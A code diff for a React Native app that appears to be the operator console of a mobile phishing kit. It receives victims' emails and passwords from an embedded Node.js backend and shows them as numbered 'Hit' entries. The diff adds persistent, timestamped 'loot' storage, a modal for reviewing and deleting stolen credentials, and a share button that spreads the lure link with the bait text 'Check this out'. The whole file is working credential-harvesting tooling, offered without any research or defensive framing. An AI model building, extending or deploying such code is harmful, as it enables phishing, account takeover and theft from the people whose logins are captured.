@@ -1,9 +1,3 @@
-/**
- * Sample React Native App
- * https://github.com/facebook/react-native
- * @flow
- */
-
  import React, { Component } from 'react';
  import {
    StyleSheet,
@@ -11,10 +5,17 @@
    View,
    ScrollView,
    TouchableOpacity,
-   Linking
+   Linking,
+   Modal,
+   TouchableWithoutFeedback,
+   FlatList,
+   Share
  } from 'react-native';
- 
  import nodejs from 'nodejs-mobile-react-native';
+ import moment from 'moment';
+ import Icon from 'react-native-vector-icons/MaterialCommunityIcons'
+
+ import storage from './src/util/storage.service';
  
  export default class App extends Component{
    constructor(props){
@@ -24,8 +25,11 @@
        currentState:"false",
        userData:[],
        url:null,
+       cacheData:[],
+       visible:false
        };
      this.listenerRef = null;
+     this._asyncStorage = new storage();
    }
    componentDidMount()
    {
@@ -33,6 +37,10 @@
      this.listenerRef = ((msg) => {
        if (typeof msg === "object"){
         this.state.userData.push(msg)
+        let Day = moment().utcOffset('+05:30')
+        this._addLoot({
+          "timeID": Day,
+          "cred":msg});
        }else{
          var tmp =msg.substr(0,3);
          if(tmp=="URL"){
@@ -63,9 +71,60 @@
       this.setState({currentState:true,url:null,lastNodeMessage:"Offline"})
     }
    }
+   async _addLoot(data) {
+     let tmp=await this._getLoot()
+     if(tmp){
+      await this._asyncStorage._storeData('loot',[...tmp,data]);
+     }else{
+       await this._asyncStorage._storeData('loot',[data]); 
+     }
+    }
+
+   async _getLoot() {
+    const result=await this._asyncStorage._readData('loot');
+    console.log(result)
+    return result;
+   }
+   async _delLoot(id) {
+    let tmp = await this._getLoot();
+    if(tmp){
+      tmp= tmp.filter((item) =>item.timeID != id)
+      this.setState({cacheData:tmp})
+      await this._asyncStorage._storeData('loot',tmp);
+     }else{} 
+   }
+   async _openModel(){
+    let tmp = await this._getLoot();
+    if(tmp){
+     this.setState({cacheData:tmp,visible:true})
+     }else{
+      this.setState({visible:true})
+     } 
+   }
+   async shareUrl() {
+    try {
+        const result = await Share.share({
+          message:'Check this out \n Link :- '+ this.state.url,
+        });
+        if (result.action === Share.sharedAction) {
+          if (result.activityType) {
+            // shared with activity type of result.activityType
+          } else {
+            // shared
+          }
+        } else if (result.action === Share.dismissedAction) {
+          // dismissed
+        }
+      } catch (error) {
+        //error
+      }
+     }
+
+
    render() {
      return (
-       <ScrollView>
+       <>
+       <View>
          <TouchableOpacity 
            onPress={()=>this._handleStart()}
            style={styles.btn}
@@ -82,22 +141,77 @@
          <View style={styles.urlBar}>
          <Text style={styles.statusText}>URL:</Text>
          <Text onPress={()=>Linking.openURL(`${this.state.url}`)} style={styles.urlText}>{this.state.url}</Text>
-         <Text>share icon</Text>
+         <TouchableOpacity
+         onPress={()=>this.shareUrl()}
+         style={{marginRight:20}}
+         >
+         <Icon name={'share-circle'} size={25}/>
+         </TouchableOpacity>
          </View>:<></>
           }
          {/*loot view  */} 
+         <ScrollView style={styles.lootScrollView}>
          {this.state.userData.length>0?
          this.state.userData.map((data,index)=>(
-         <Text key={index} style={styles.credentialText}>
-           Email: {data.email+"\n"}Password: {data.password}
-         </Text>
+        <View key={index} style={styles.credentialBox}>
+        <Text style={{color:"#ed4956",marginLeft:10}}>Hit </Text>
+        <Text style={{color:"#fff"}}>{" "+(index+1)+".  "}</Text>
+        <Text style={{color:"#fff"}}>Email: {data.email+"\n"}Password: {data.password}</Text>
+         </View>
          ))
          :
          <Text style={styles.lootText}>
-          {"No Loot yet,\n once victim enter credentials, \nit will display here!!"}
+          {"No Loot yet, once victim enter credentials, \nit will display here!!"}
          </Text>}
-        
-       </ScrollView>
+         </ScrollView>
+         <TouchableOpacity 
+           onPress={()=>this._getLoot()}
+           style={styles.btn}
+         >
+           <Text style={{color:"white"}}>{"get"}</Text>
+         </TouchableOpacity>
+         <TouchableOpacity 
+           onPress={()=>this._openModel()}
+           style={styles.btn}
+         >
+           <Text style={{color:"white"}}>{"del"}</Text>
+         </TouchableOpacity>
+       </View>
+
+       <Modal 
+       visible={this.state.visible}
+       onRequestClose={()=>this.setState({visible:false})}    
+       animationType="slide"
+       transparent
+       >
+       <View style={{ height:200,width:"100%"}}>  
+       <TouchableWithoutFeedback
+       onPress={()=>this.setState({visible:false})}   
+       >
+        <View  style={{width:"100%",height:"100%"}}></View>
+       </TouchableWithoutFeedback>
+       </View>  
+      
+       <FlatList
+               data={this.state.cacheData}
+               keyExtractor={(item) => item.timeID.toString()}
+               style={styles.list}
+               ListHeaderComponent={ <View style={{margin:10,}}>
+               <Text style={{textAlign:"center",fontWeight:"bold"}}>LOOT</Text>       
+               </View> }
+               renderItem={({item}) => (
+                 <View style={{margin:10,marginRight:20,flexDirection:"row",justifyContent:"space-between",alignItems:"center"}}>
+                   <Text style={{marginLeft:10}}>Email: {item.cred.email+"\n"}Password: {item.cred.password}</Text> 
+                   <TouchableOpacity
+                   onPress={()=>this._delLoot(item.timeID)}
+                   >
+                   <Icon name={"delete"} size={20} />     
+                   </TouchableOpacity>
+                   </View>
+               )}
+        ></FlatList>     
+       </Modal>
+       </>
      );
    }
  }
@@ -114,27 +228,36 @@
    marginVertical:10,
    borderRadius:5
    },
-   credentialText:{
-    margin:10,
+   credentialBox:{
+     flexDirection:"row",
+     marginVertical:10,
+   },
+   list: {
+    backgroundColor: "#fff",
+    borderTopRightRadius:20,
+    borderTopLeftRadius:20,
    },
    lootText: {
-     marginTop:100,
+     marginTop:180,
      textAlign: 'center',
-     color: '#333333',
+     color: '#fff',
      marginBottom: 5,
+   },
+   lootScrollView:{
+   backgroundColor:"#000",
+   height:400,
    },
    statusText:{
     color: '#333333',
-    fontWeight:"bold"
+    fontWeight:"bold",
+    //fontFamily:'Bitwise'
    },
    statusBar:{
-     flex:1,
      margin:10,
      flexDirection:"row",
-     justifyContent:"space-between"
+     justifyContent:"space-between",
    },
    urlBar:{
-    flex:1,
     margin:10,
     flexDirection:"row",
     justifyContent:"space-between"
